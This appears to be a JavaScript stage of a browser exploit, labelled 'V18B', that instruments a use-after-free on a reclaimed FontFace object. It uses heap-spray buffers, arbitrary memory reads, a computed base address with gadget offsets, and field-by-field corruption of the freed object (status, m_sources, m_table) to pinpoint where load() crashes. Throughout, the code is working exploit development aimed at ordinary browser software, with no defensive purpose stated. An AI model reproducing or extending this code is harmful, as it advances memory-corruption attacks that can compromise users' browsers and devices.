// V18B Patch: Detailed Dispatch Instrumentation
// Pinpoints exact crash location in load() path

/* ==== V18B: DETAILED DISPATCH INSTRUMENTATION ====
 *
 * FINDING: V18 Phase 1 (m_table=nullptr) still crashes!
 * This means the hang is NOT in WeakHashSet cleanup.
 *
 * V18B adds fine-grained instrumentation to find the exact crash location:
 * 1. Test with REAL face (not reclaimed) - does load() work at all?
 * 2. Test with reclaimed face but NO modifications - does it crash?
 * 3. Test with reclaimed face + minimal modifications - which field causes crash?
 * 4. Add beacons between each step of pump() to find exact crash point
 */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V18B-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      /* Save pre-state for witness */
      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ==== TEST 1: REAL FACE LOAD (CONTROL) ====
       * First, verify that load() works on a REAL, unmodified face.
       * This establishes that the load() machinery itself is functional.
       */
      bs('V18B-TEST1-REAL-FACE-LOAD');

      /* Find a real face (not our reclaimed one) */
      var realFaceIdx=-1;
      for(var rfi=0;rfi<faces.length;rfi++){
        if(rfi!==zi){realFaceIdx=rfi;break;}
      }

      if(realFaceIdx>=0){
        bs('V18B-REAL-FACE-IDX='+realFaceIdx);
        try{
          faces[realFaceIdx].load();
          bs('V18B-REAL-FACE-LOAD-RETURNED');
        }catch(e){
          bs('V18B-REAL-FACE-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
        }
      }else{
        bs('V18B-REAL-FACE-NONE-FOUND');
      }

      /* ==== TEST 2: RECLAIMED FACE, NO MODIFICATIONS ====
       * Test load() on our reclaimed face WITHOUT any modifications.
       * This tells us if the reclaim itself is the problem.
       */
      bs('V18B-TEST2-RECLAIMED-NOMOD');

      /* Restore original table pointer (in case previous test modified it) */
      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);

      try{
        faces[zi].load();
        bs('V18B-RECLAIMED-NOMOD-RETURNED');
      }catch(e){
        bs('V18B-RECLAIMED-NOMOD-THREW-'+String(e&&e.message?e.message:'?'));
      }

      /* ==== TEST 3: RECLAIMED FACE + STATUS ONLY ====
       * Set ONLY the status byte to Pending (0), leave everything else.
       * This tests if the status field is the problem.
       */
      bs('V18B-TEST3-STATUS-ONLY');

      hitBuf[0x82]=0;  /* status = Pending */

      try{
        faces[zi].load();
        bs('V18B-STATUS-ONLY-RETURNED');
      }catch(e){
        bs('V18B-STATUS-ONLY-THREW-'+String(e&&e.message?e.message:'?'));
      }

      /* ==== TEST 4: RECLAIMED FACE + STATUS + OVERRIDE ====
       * Set status to Pending AND FontLoadTimingOverride to Block.
       * This tests if the override field is the problem.
       */
      bs('V18B-TEST4-STATUS-OVERRIDE');

      hitBuf[0x82]=0;  /* status = Pending */
      hitBuf[0x87]=1;  /* override = Block */

      try{
        faces[zi].load();
        bs('V18B-STATUS-OVERRIDE-RETURNED');
      }catch(e){
        bs('V18B-STATUS-OVERRIDE-THREW-'+String(e&&e.message?e.message:'?'));
      }

      /* ==== TEST 5: RECLAIMED FACE + EMPTY SOURCES ====
       * Zero out the m_sources vector (face+0x28..0x30).
       * This tests if invalid sources are the problem.
       */
      bs('V18B-TEST5-EMPTY-SOURCES');

      hitBuf[0x82]=0;  /* status = Pending */
      hitBuf[0x87]=1;  /* override = Block */

      /* Zero m_sources vector (pointer, size, capacity) */
      for(var sz=0x28;sz<=0x37;sz++)hitBuf[sz]=0;

      try{
        faces[zi].load();
        bs('V18B-EMPTY-SOURCES-RETURNED');
      }catch(e){
        bs('V18B-EMPTY-SOURCES-THREW-'+String(e&&e.message?e.message:'?'));
      }

      /* ==== TEST 6: RECLAIMED FACE + NULL TABLE ====
       * Set m_table to nullptr (V18 Phase 1 configuration).
       * This is the test that crashed in V18.
       */
      bs('V18B-TEST6-NULL-TABLE');

      hitBuf[0x82]=0;  /* status = Pending */
      hitBuf[0x87]=1;  /* override = Block */

      /* Zero m_sources */
      for(var sz=0x28;sz<=0x37;sz++)hitBuf[sz]=0;

      /* m_table = nullptr */
      for(var i=0;i<8;i++)hitBuf[0x58+i]=0;

      /* Hash-table object header: {3, 0x200} */
      hitBuf[0x60]=3; hitBuf[0x61]=0; hitBuf[0x62]=0; hitBuf[0x63]=0;
      hitBuf[0x64]=0; hitBuf[0x65]=2; hitBuf[0x66]=0; hitBuf[0x67]=0;

      bs('V18B-NULL-TABLE-PRE-LOAD');
      try{
        faces[zi].load();
        bs('V18B-NULL-TABLE-RETURNED');
      }catch(e){
        bs('V18B-NULL-TABLE-THREW-'+String(e&&e.message?e.message:'?'));
      }

      /* ==== TEST 7: TIMER REGION ANALYSIS ====
       * Dump the timer region to see if it's being accessed.
       */
      bs('V18B-TEST7-TIMER-ANALYSIS');

      var timerH=readAt(S+0x88n,0x38);
      bs('V18B-TIMER-REGION='+timerH);

      /* ==== TEST 8: PROMISE ANALYSIS ====
       * Check if the promise object is valid.
       */
      bs('V18B-TEST8-PROMISE-ANALYSIS');

      var promisePtr=0n;
      for(var pb=0;pb<8;pb++)promisePtr|=BigInt(hitBuf[0x18+pb])<<BigInt(pb*8);
      bs('V18B-PROMISE-PTR='+hex(promisePtr));

      if(promisePtr>0x1000000000n&&promisePtr<0x10000000000n){
        var promiseH=readAt(promisePtr,0x40);
        bs('V18B-PROMISE-RAW='+promiseH);
      }else{
        bs('V18B-PROMISE-INVALID');
      }

      /* Restore original table pointer */
      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
      bs('V18B-RESTORED');

      /* Verdict */
      verd('ok','V18B instrumentation complete');
      bs('V18B-DONE');

    }else bs('V18B-SKIP-bad-idx');
  }else bs('V18B-SKIP-missing-data');
}catch(e18b){bs('V18B-ERR-'+String(e18b&&e18b.message?e18b.message:'?'));}
/* ==== V18B END ==== */
